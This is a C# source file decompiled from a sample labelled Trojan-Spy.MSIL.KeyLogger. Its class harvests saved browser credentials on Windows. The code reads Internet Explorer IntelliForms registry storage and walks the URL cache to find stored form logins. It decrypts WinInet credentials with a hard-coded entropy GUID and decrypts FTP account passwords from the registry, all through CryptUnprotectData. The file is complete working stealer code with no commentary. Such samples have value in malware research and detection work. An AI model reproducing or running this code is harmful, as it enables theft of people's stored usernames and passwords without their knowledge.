// Decompiled with JetBrains decompiler
// Type: Roy.CIE7Passwords
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Roy
{
  internal class CIE7Passwords : CUtils, IEnumerable<CIE7Password>
  {
    private const int ERROR_CACHE_FIND_FAIL = 0;
    private const int ERROR_CACHE_FIND_SUCCESS = 1;
    private const int MAX_PATH = 260;
    private const int MAX_CACHE_ENTRY_INFO_SIZE = 4096;
    private const int NORMAL_CACHE_ENTRY = 1;
    private const int URLHISTORY_CACHE_ENTRY = 2097152;
    private const int PROV_RSA_FULL = 1;
    private const int ALG_CLASS_HASH = 32768;
    private const int ALG_TYPE_ANY = 0;
    private const int ALG_SID_SHA = 4;
    private const int CALG_SHA = 32772;
    private const int AT_SIGNATURE = 2;
    private const int HP_HASHVAL = 2;
    private const int READ_CONTROL = 131072;
    private const int STANDARD_RIGHTS_READ = 131072;
    private const int KEY_QUERY_VALUE = 1;
    private const int KEY_ENUMERATE_SUB_KEYS = 8;
    private const int KEY_NOTIFY = 16;
    private const int SYNCHRONIZE = 1048576;
    private const int STANDARD_RIGHTS_WRITE = 131072;
    private const int KEY_SET_VALUE = 2;
    private const int KEY_CREATE_SUB_KEY = 4;
    private const int KEY_READ = 131097;
    private const int KEY_WRITE = 131078;
    private const int HKEY_CURRENT_USER = -2147483647;
    private List<CIE7Password> m_IEPass;
    [SpecialName]
    private CIE7Passwords.SYSTEMTIME \u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst;
    [SpecialName]
    private CIE7Passwords.FILETIME \u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lft;

    public CIE7Passwords() => this.m_IEPass = new List<CIE7Password>();

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FileTimeToLocalFileTime(
      ref CIE7Passwords.FILETIME lpFileTime,
      ref CIE7Passwords.FILETIME lpLocalFileTime);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FileTimeToSystemTime(
      ref CIE7Passwords.FILETIME lpFileTime,
      ref CIE7Passwords.SYSTEMTIME lpSystemTime);

    [DllImport("wininet.dll", EntryPoint = "FindFirstUrlCacheEntryA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindFirstUrlCacheEntry(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszUrlSearchPattern,
      IntPtr lpFirstCacheEntryInfo,
      ref int lpdwFirstCacheEntryInfoBufferSize);

    [DllImport("wininet.dll", EntryPoint = "FindNextUrlCacheEntryA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindNextUrlCacheEntry(
      int hEnum,
      IntPtr lpFirstCacheEntryInfo,
      ref int lpdwFirstCacheEntryInfoBufferSize);

    [DllImport("wininet.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindCloseUrlCache(int hEnumHandle);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrlenA(IntPtr lpString);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrcpyA([MarshalAs(UnmanagedType.VBByRefStr)] ref string RetVal, int ptr);

    [DllImport("advapi32.dll", EntryPoint = "CryptAcquireContextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptAcquireContext(
      ref int phProv,
      int pszContainer,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszProvider,
      int dwProvType,
      int dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptCreateHash(
      int hProv,
      int Algid,
      int hKey,
      int dwFlags,
      ref int phHash);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptHashData(int hHash, IntPtr pbData, int dwDataLen, int dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptGetHashParam(
      int hHash,
      int dwParam,
      IntPtr pByte,
      ref int pdwDataLen,
      int dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptGetHashParam(
      int hHash,
      int dwParam,
      [MarshalAs(UnmanagedType.LPArray)] ref byte[] pByte,
      ref int pdwDataLen,
      int dwFlags);

    [DllImport("advapi32.dll", EntryPoint = "CryptSignHashA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptSignHash(
      int hHash,
      int dwKeySpec,
      int sDescription,
      int dwFlags,
      int pbSignature,
      ref int pdwSigLen);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptDestroyHash(int hHash);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptReleaseContext(int hProv, int dwFlags);

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegOpenKeyEx(
      int hKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey,
      int ulOptions,
      int samDesired,
      ref int phkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegQueryValueEx(
      int hKey,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName,
      int lpReserved,
      ref int lpType,
      IntPtr lpData,
      ref int lpcbData);

    [DllImport("advapi32.dll", EntryPoint = "RegDeleteValueA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegDeleteValue(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int LocalFree(int hMem);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegCloseKey(int hKey);

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptUnprotectData(
      ref CIE7Passwords.DATA_BLOB pDataIn,
      int ppszDataDescr,
      IntPtr pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref CIE7Passwords.DATA_BLOB pDataOut);

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptUnprotectData(
      ref CIE7Passwords.DATA_BLOB pDataIn,
      int ppszDataDescr,
      ref CIE7Passwords.DATA_BLOB pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref CIE7Passwords.DATA_BLOB pDataOut);

    [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredEnumerate(
      [MarshalAs(UnmanagedType.LPWStr)] string lpszFilter,
      int lFlags,
      ref int pCount,
      ref int lppCredentials);

    [DllImport("advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredDelete([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredFree(int pBuffer);

    [DllImport("oleaut32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern string SysAllocString(int pOlechar);

    private string GetStrFromPtrA(IntPtr lpszA) => Marshal.PtrToStringAnsi(lpszA);

    private byte CheckSum(ref string s)
    {
      int num1 = 0;
      int num2 = Strings.Len(s);
      int Start = 1;
      while (Start <= num2)
      {
        checked { num1 += (int) Math.Round(Conversion.Val("&H" + Strings.Mid(s, Start, 2))); }
        checked { Start += 2; }
      }
      return checked ((byte) unchecked (num1 % 256));
    }

    private string GetSHA1Hash(ref byte[] pbData)
    {
      pbData = (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) pbData, (Array) new byte[checked (pbData.Length + 1 + 1)]);
      byte[] hash = SHA1.Create().ComputeHash(pbData);
      string shA1Hash = "";
      int num = checked (hash.Length - 1);
      int index = 0;
      while (index <= num)
      {
        shA1Hash += Strings.Right("00" + Conversion.Hex(hash[index]), 2);
        checked { ++index; }
      }
      return shA1Hash;
    }

    private DateTime FileTimeToDate(ref CIE7Passwords.FILETIME ftDateTime)
    {
      CIE7Passwords.FileTimeToLocalFileTime(ref ftDateTime, ref this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lft);
      CIE7Passwords.FileTimeToSystemTime(ref this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lft, ref this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst);
      return DateTime.FromOADate(DateAndTime.DateSerial((int) this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst.wYear, (int) this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst.wMonth, (int) this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst.wDay).ToOADate() + DateAndTime.TimeSerial((int) this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst.wHour, (int) this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst.wMinute, (int) this.\u0024STATIC\u0024FileTimeToDate\u00242011139101154\u0024lst.wSecond).ToOADate());
    }

    private void ProcessIEPass(string strURL, string strHash, CIE7Passwords.DATA_BLOB dataOut)
    {
      CIE7Passwords.StringIndexEntry Expression1;
      int num1 = Strings.Len((object) Expression1);
      CIE7Passwords.StringIndexHeader Expression2;
      Strings.Len((object) Expression2);
      IntPtr ptr1;
      ref IntPtr local = ref ptr1;
      int pbData = dataOut.pbData;
      IntPtr ptr2 = new IntPtr(dataOut.pbData);
      int num2 = (int) Marshal.ReadByte(ptr2);
      int num3 = checked (pbData + num2);
      local = new IntPtr(num3);
      object structure1 = Marshal.PtrToStructure(ptr1, Expression2.GetType());
      CIE7Passwords.StringIndexHeader stringIndexHeader1;
      CIE7Passwords.StringIndexHeader stringIndexHeader2 = structure1 != null ? (CIE7Passwords.StringIndexHeader) structure1 : stringIndexHeader1;
      CIE7Passwords.StringIndexEntry stringIndexEntry1;
      string str;
      if (stringIndexHeader2.dwType == 1)
      {
        if (stringIndexHeader2.dwEntriesCount < 2)
          return;
        IntPtr ptr3 = new IntPtr(checked (ptr1.ToInt32() + stringIndexHeader2.dwStructSize));
        IntPtr num4 = new IntPtr(checked (ptr3.ToInt32() + stringIndexHeader2.dwEntriesCount * num1));
        int num5 = checked (stringIndexHeader2.dwEntriesCount - 1);
        int num6 = 0;
        while (num6 <= num5 && !(num4 == IntPtr.Zero | ptr3 == IntPtr.Zero))
        {
          CIE7Passwords.StringIndexEntry stringIndexEntry2;
          object structure2 = Marshal.PtrToStructure(ptr3, stringIndexEntry2.GetType());
          stringIndexEntry2 = structure2 != null ? (CIE7Passwords.StringIndexEntry) structure2 : stringIndexEntry1;
          IntPtr num7 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
          string szUserName;
          if (CIE7Passwords.lstrlenA(num7) != stringIndexEntry2.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
            szUserName = Marshal.PtrToStringUni(ptr2);
          }
          else
          {
            num7 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
            szUserName = Marshal.PtrToStringAnsi(num7);
          }
          ptr3 = new IntPtr(checked (ptr3.ToInt32() + num1));
          object structure3 = Marshal.PtrToStructure(ptr3, stringIndexEntry2.GetType());
          stringIndexEntry2 = structure3 != null ? (CIE7Passwords.StringIndexEntry) structure3 : stringIndexEntry1;
          str = Strings.Space(stringIndexEntry2.dwDataSize);
          num7 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
          string szPasswd;
          if (CIE7Passwords.lstrlenA(num7) != stringIndexEntry2.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
            szPasswd = Marshal.PtrToStringUni(ptr2);
          }
          else
          {
            num7 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
            szPasswd = Marshal.PtrToStringAnsi(num7);
          }
          ptr3 = new IntPtr(checked (ptr3.ToInt32() + num1));
          this.m_IEPass.Add(new CIE7Password(strHash, strURL, szUserName, szPasswd, this.FileTimeToDate(ref stringIndexEntry2.ftInsertDateTime), 1, string.Empty));
          checked { num6 += 2; }
        }
      }
      else
      {
        if (stringIndexHeader2.dwType != 0)
          return;
        str = (string) null;
        IntPtr ptr4 = new IntPtr(checked (ptr1.ToInt32() + stringIndexHeader2.dwStructSize));
        IntPtr num8 = new IntPtr(checked (ptr4.ToInt32() + stringIndexHeader2.dwEntriesCount * num1));
        if (num8 == IntPtr.Zero | ptr4 == IntPtr.Zero)
          return;
        int num9 = checked (stringIndexHeader2.dwEntriesCount - 1);
        int num10 = 0;
        while (num10 <= num9)
        {
          CIE7Passwords.StringIndexEntry stringIndexEntry3;
          object structure4 = Marshal.PtrToStructure(ptr4, stringIndexEntry3.GetType());
          stringIndexEntry3 = structure4 != null ? (CIE7Passwords.StringIndexEntry) structure4 : stringIndexEntry1;
          Strings.Space(stringIndexEntry3.dwDataSize);
          IntPtr num11 = new IntPtr(checked (num8.ToInt32() + stringIndexEntry3.dwDataOffset));
          string szUserName;
          if (CIE7Passwords.lstrlenA(num11) != stringIndexEntry3.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num8.ToInt32() + stringIndexEntry3.dwDataOffset));
            szUserName = Marshal.PtrToStringUni(ptr2);
          }
          else
          {
            num11 = new IntPtr(checked (num8.ToInt32() + stringIndexEntry3.dwDataOffset));
            szUserName = Marshal.PtrToStringAnsi(num11);
          }
          ptr4 = new IntPtr(checked (ptr4.ToInt32() + num1));
          this.m_IEPass.Add(new CIE7Password(strHash, strURL, szUserName, string.Empty, this.FileTimeToDate(ref stringIndexEntry3.ftInsertDateTime), 0, string.Empty));
          checked { ++num10; }
        }
      }
    }

    private void AddPasswdInfo(string strRess, int hKey)
    {
      strRess = Strings.LCase(strRess);
      byte[] bytes = Encoding.Unicode.GetBytes(strRess);
      string shA1Hash = this.GetSHA1Hash(ref bytes);
      string lpValueName = shA1Hash + Strings.Right("00" + Conversion.Hex(this.CheckSum(ref shA1Hash)), 2);
      int lpType;
      int lpcbData;
      int num = CIE7Passwords.RegQueryValueEx(hKey, ref lpValueName, 0, ref lpType, IntPtr.Zero, ref lpcbData);
      if (lpcbData <= 0)
        return;
      IntPtr lpData = Marshal.AllocHGlobal(lpcbData);
      num = CIE7Passwords.RegQueryValueEx(hKey, ref lpValueName, 0, ref lpType, lpData, ref lpcbData);
      CIE7Passwords.DATA_BLOB pDataIn;
      pDataIn.cbData = lpcbData;
      pDataIn.pbData = lpData.ToInt32();
      CIE7Passwords.DATA_BLOB pOptionalEntropy;
      pOptionalEntropy.cbData = checked (Strings.Len(strRess) * 2 + 2);
      ref CIE7Passwords.DATA_BLOB local = ref pOptionalEntropy;
      IntPtr hglobal = Marshal.StringToHGlobalUni(strRess);
      int int32 = hglobal.ToInt32();
      local.pbData = int32;
      CIE7Passwords.DATA_BLOB pDataOut;
      CIE7Passwords.CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
      this.ProcessIEPass(strRess, lpValueName, pDataOut);
      hglobal = new IntPtr(pOptionalEntropy.pbData);
      Marshal.FreeHGlobal(hglobal);
      CIE7Passwords.LocalFree(pDataOut.pbData);
    }

    public void Delete(string szResourceName)
    {
      string lpSubKey = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
      int phkResult;
      CIE7Passwords.RegOpenKeyEx(-2147483647, ref lpSubKey, 0, 131078, ref phkResult);
      CIE7Passwords.RegDeleteValue(phkResult, ref szResourceName);
      CIE7Passwords.RegCloseKey(phkResult);
      CIE7Passwords.CredDelete(szResourceName, 1, 0);
    }

    public void Refresh()
    {
      Regex regex = new Regex("name=\"([^\"]+)\"", RegexOptions.Compiled);
      this.m_IEPass.Clear();
      string lpSubKey1 = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage1";
      int phkResult1;
      CIE7Passwords.RegOpenKeyEx(-2147483647, ref lpSubKey1, 0, 131097, ref phkResult1);
      string lpSubKey2 = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
      int phkResult2;
      CIE7Passwords.RegOpenKeyEx(-2147483647, ref lpSubKey2, 0, 131097, ref phkResult2);
      IntPtr num1;
      if (phkResult2 != 0 || phkResult1 != 0)
      {
        string lpszUrlSearchPattern1 = (string) null;
        int lpdwFirstCacheEntryInfoBufferSize;
        CIE7Passwords.FindFirstUrlCacheEntry(ref lpszUrlSearchPattern1, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
        if (lpdwFirstCacheEntryInfoBufferSize > 0)
        {
          IntPtr num2 = Marshal.AllocHGlobal(lpdwFirstCacheEntryInfoBufferSize);
          Marshal.WriteInt32(num2, lpdwFirstCacheEntryInfoBufferSize);
          string lpszUrlSearchPattern2 = (string) null;
          int firstUrlCacheEntry = CIE7Passwords.FindFirstUrlCacheEntry(ref lpszUrlSearchPattern2, num2, ref lpdwFirstCacheEntryInfoBufferSize);
          do
          {
            CIE7Passwords.INTERNET_CACHE_ENTRY_INFO internetCacheEntryInfo1;
            object structure = Marshal.PtrToStructure(num2, internetCacheEntryInfo1.GetType());
            CIE7Passwords.INTERNET_CACHE_ENTRY_INFO internetCacheEntryInfo2;
            internetCacheEntryInfo1 = structure != null ? (CIE7Passwords.INTERNET_CACHE_ENTRY_INFO) structure : internetCacheEntryInfo2;
            if ((internetCacheEntryInfo1.CacheEntryType & 2097153) != 0)
            {
              num1 = new IntPtr(internetCacheEntryInfo1.lpszSourceUrlName);
              string str = this.GetStrFromPtrA(num1);
              if (str.IndexOf("?") >= 0)
                str = str.Substring(0, str.IndexOf("?"));
              if (Strings.InStr(str, "@") > 0)
                str = Strings.Mid(str, checked (Strings.InStr(str, "@") + 1));
              if (phkResult1 != 0 && (internetCacheEntryInfo1.CacheEntryType & 1) == 1)
              {
                num1 = new IntPtr(internetCacheEntryInfo1.lpHeaderInfo);
                string strFromPtrA1 = this.GetStrFromPtrA(num1);
                if (!string.IsNullOrEmpty(strFromPtrA1) && strFromPtrA1.Contains("text/html"))
                {
                  num1 = new IntPtr(internetCacheEntryInfo1.lpszLocalFileName);
                  string strFromPtrA2 = this.GetStrFromPtrA(num1);
                  try
                  {
                    try
                    {
                      foreach (Match match in regex.Matches(File.ReadAllText(strFromPtrA2)))
                        this.AddPasswdInfo(match.Groups[1].Value, phkResult1);
                    }
                    finally
                    {
                      IEnumerator enumerator;
                      if (enumerator is IDisposable)
                        (enumerator as IDisposable).Dispose();
                    }
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
              this.AddPasswdInfo(str, phkResult2);
            }
            lpdwFirstCacheEntryInfoBufferSize = 0;
            CIE7Passwords.FindNextUrlCacheEntry(firstUrlCacheEntry, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
            Marshal.FreeHGlobal(num2);
            if (lpdwFirstCacheEntryInfoBufferSize > 0)
            {
              num2 = Marshal.AllocHGlobal(lpdwFirstCacheEntryInfoBufferSize);
              Marshal.WriteInt32(num2, lpdwFirstCacheEntryInfoBufferSize);
            }
          }
          while (CIE7Passwords.FindNextUrlCacheEntry(firstUrlCacheEntry, num2, ref lpdwFirstCacheEntryInfoBufferSize) != 0);
          CIE7Passwords.FindCloseUrlCache(firstUrlCacheEntry);
        }
        CIE7Passwords.RegCloseKey(phkResult1);
        CIE7Passwords.RegCloseKey(phkResult2);
      }
      int pCount;
      int lppCredentials;
      CIE7Passwords.CredEnumerate("Microsoft_WinInet_*", 0, ref pCount, ref lppCredentials);
      short[] numArray1 = new short[37];
      CIE7Passwords.DATA_BLOB pOptionalEntropy;
      CIE7Passwords.DATA_BLOB pDataIn;
      CIE7Passwords.DATA_BLOB pDataOut;
      if (pCount > 0)
      {
        int num3 = checked (pCount - 1);
        int num4 = 0;
        while (num4 <= num3)
        {
          num1 = new IntPtr(checked (lppCredentials + num4 * 4));
          CIE7Passwords.CREDENTIAL credential1;
          object structure = Marshal.PtrToStructure(Marshal.ReadIntPtr(num1), credential1.GetType());
          CIE7Passwords.CREDENTIAL credential2;
          credential1 = structure != null ? (CIE7Passwords.CREDENTIAL) structure : credential2;
          num1 = new IntPtr(credential1.lpstrTargetName);
          string str1 = this.CopyString(num1);
          pOptionalEntropy.cbData = 74;
          IntPtr num5 = Marshal.AllocHGlobal(74);
          string str2 = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
          int num6 = 0;
          do
          {
            Marshal.WriteInt16(num5, checked (num6 * 2), checked ((short) (Strings.Asc(Strings.Mid(str2, num6 + 1, 1)) * 4)));
            checked { ++num6; }
          }
          while (num6 <= 36);
          pOptionalEntropy.pbData = num5.ToInt32();
          pDataIn.pbData = credential1.lpbCredentialBlob;
          pDataIn.cbData = credential1.dwCredentialBlobSize;
          pDataOut.cbData = 0;
          pDataOut.pbData = 0;
          CIE7Passwords.CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
          Marshal.FreeHGlobal(num5);
          num1 = new IntPtr(pDataOut.pbData);
          string[] strArray = Strings.Split(Marshal.PtrToStringUni(num1), ":");
          int num7 = Strings.InStr(Strings.Mid(str1, 19), "/");
          if (num7 > 0)
            this.m_IEPass.Add(new CIE7Password(str1, Strings.Mid(str1, 19, checked (num7 - 1)), strArray[0], strArray[1], DateTime.MinValue, 2, Strings.Mid(str1, checked (19 + num7))));
          else
            this.m_IEPass.Add(new CIE7Password(str1, Strings.Mid(str1, 19), strArray[0], strArray[1], DateTime.MinValue, 2, string.Empty));
          CIE7Passwords.LocalFree(pDataOut.pbData);
          checked { ++num4; }
        }
      }
      CIE7Passwords.CredFree(lppCredentials);
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\FTP\\Accounts");
      string[] subKeyNames1 = registryKey1.GetSubKeyNames();
      int index1 = 0;
      while (index1 < subKeyNames1.Length)
      {
        string name1 = subKeyNames1[index1];
        RegistryKey registryKey2 = registryKey1.OpenSubKey(name1);
        string[] subKeyNames2 = registryKey2.GetSubKeyNames();
        int index2 = 0;
        while (index2 < subKeyNames2.Length)
        {
          string name2 = subKeyNames2[index2];
          byte[] numArray2 = (byte[]) registryKey2.OpenSubKey(name2).GetValue("Password");
          byte[] numArray3 = new byte[4];
          int num8 = checked (name1.Length - 1);
          int index3 = 0;
          while (index3 <= num8)
          {
            byte num9 = checked ((byte) ((int) name1[index3] & 31));
            numArray3[index3 & 3] = checked ((byte) unchecked ((int) numArray3[index3 & 3] + (int) num9));
            checked { ++index3; }
          }
          pDataIn.cbData = numArray2.Length;
          ref CIE7Passwords.DATA_BLOB local1 = ref pDataIn;
          IntPtr num10 = Marshal.AllocHGlobal(numArray2.Length);
          int int32_1 = num10.ToInt32();
          local1.pbData = int32_1;
          byte[] source = numArray2;
          num10 = new IntPtr(pDataIn.pbData);
          IntPtr destination = num10;
          int length = numArray2.Length;
          Marshal.Copy(source, 0, destination, length);
          pDataOut.cbData = 0;
          pDataOut.pbData = 0;
          GCHandle gcHandle = GCHandle.Alloc((object) numArray3, GCHandleType.Pinned);
          ref CIE7Passwords.DATA_BLOB local2 = ref pOptionalEntropy;
          IntPtr ptr = gcHandle.AddrOfPinnedObject();
          int int32_2 = ptr.ToInt32();
          local2.pbData = int32_2;
          pOptionalEntropy.cbData = 4;
          CIE7Passwords.CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
          gcHandle.Free();
          List<CIE7Password> iePass = this.m_IEPass;
          string szResourceName = name1;
          string szURL = string.Format("ftp://{0}@{1}/", (object) name1, (object) name2);
          string szUserName = name2;
          ptr = new IntPtr(pDataOut.pbData);
          string stringUni = Marshal.PtrToStringUni(ptr);
          DateTime minValue = DateTime.MinValue;
          string empty = string.Empty;
          CIE7Password ciE7Password = new CIE7Password(szResourceName, szURL, szUserName, stringUni, minValue, 3, empty);
          iePass.Add(ciE7Password);
          CIE7Passwords.LocalFree(pDataOut.pbData);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    public IEnumerator<CIE7Password> GetEnumerator()
    {
      this.Refresh();
      return (IEnumerator<CIE7Password>) this.m_IEPass.GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator1()
    {
      this.Refresh();
      return (IEnumerator) this.m_IEPass.GetEnumerator();
    }

    private struct SYSTEMTIME
    {
      public short wYear;
      public short wMonth;
      public short wDayOfWeek;
      public short wDay;
      public short wHour;
      public short wMinute;
      public short wSecond;
      public short wMilliseconds;
    }

    private struct FILETIME
    {
      public int dwLowDateTime;
      public int dwHighDateTime;
    }

    private struct INTERNET_CACHE_ENTRY_INFO
    {
      public int dwStructSize;
      public int lpszSourceUrlName;
      public int lpszLocalFileName;
      public int CacheEntryType;
      public int dwUseCount;
      public int dwHitRate;
      public int dwSizeLow;
      public int dwSizeHigh;
      public CIE7Passwords.FILETIME LastModifiedTime;
      public CIE7Passwords.FILETIME ExpireTime;
      public CIE7Passwords.FILETIME LastAccessTime;
      public CIE7Passwords.FILETIME LastSyncTime;
      public int lpHeaderInfo;
      public int dwHeaderInfoSize;
      public int lpszFileExtension;
      public int dwExemptDelta;
    }

    private struct DATA_BLOB
    {
      public int cbData;
      public int pbData;
    }

    private struct StringIndexHeader
    {
      public int dwWICK;
      public int dwStructSize;
      public int dwEntriesCount;
      public int dwUnkId;
      public int dwType;
      public int dwUnk;
    }

    private struct StringIndexEntry
    {
      public int dwDataOffset;
      public CIE7Passwords.FILETIME ftInsertDateTime;
      public int dwDataSize;
    }

    private enum CRED_TYPE
    {
      GENERIC = 1,
      DOMAIN_PASSWORD = 2,
      DOMAIN_CERTIFICATE = 3,
      DOMAIN_VISIBLE_PASSWORD = 4,
      MAXIMUM = 5,
    }

    private struct CREDENTIAL_ATTRIBUTE
    {
      public int lpstrKeyword;
      public int dwFlags;
      public int dwValueSize;
      public int lpbValue;
    }

    private struct CREDENTIAL
    {
      public int dwFlags;
      public int dwType;
      public int lpstrTargetName;
      public int lpstrComment;
      public CIE7Passwords.FILETIME ftLastWritten;
      public int dwCredentialBlobSize;
      public int lpbCredentialBlob;
      public int dwPersist;
      public int dwAttributeCount;
      public int lpAttributes;
      public int lpstrTargetAlias;
      public int lpUserName;
    }

    private struct IEPass
    {
      public int dwType;
      public string strResource;
      public string strUserName;
      public string strPassword;
      public string strURL;
      public string strDescription;
      public DateTime ftAddDate;
    }
  }
}
